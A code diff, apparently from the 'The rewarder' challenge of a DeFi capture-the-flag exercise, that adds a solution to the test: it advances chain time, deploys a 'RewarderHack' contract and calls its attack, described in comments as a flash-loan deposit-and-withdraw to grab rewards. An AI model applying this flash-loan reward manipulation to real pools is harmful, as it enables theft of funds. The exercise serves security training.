@@ -69,7 +69,17 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      /** CODE YOUR SOLUTION HERE */
+      
+      // Let reward time pass w/ no deposits
+      await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]); // 6 days
+      // Setup our contract        
+      const RewarderHackFactory = await ethers.getContractFactory('RewarderHack', player);
+      let hackContract = await RewarderHackFactory.deploy(flashLoanPool.address, rewarderPool.address, liquidityToken.address);
+      // Call its attack functin we set up
+      await hackContract.attackTarget(TOKENS_IN_LENDER_POOL);
+      // Take flash loan of max amount, deposit it, then withdraw it and return, all handled above
+      // And returned to owner/player to pass test
     });
 
     after(async function () {
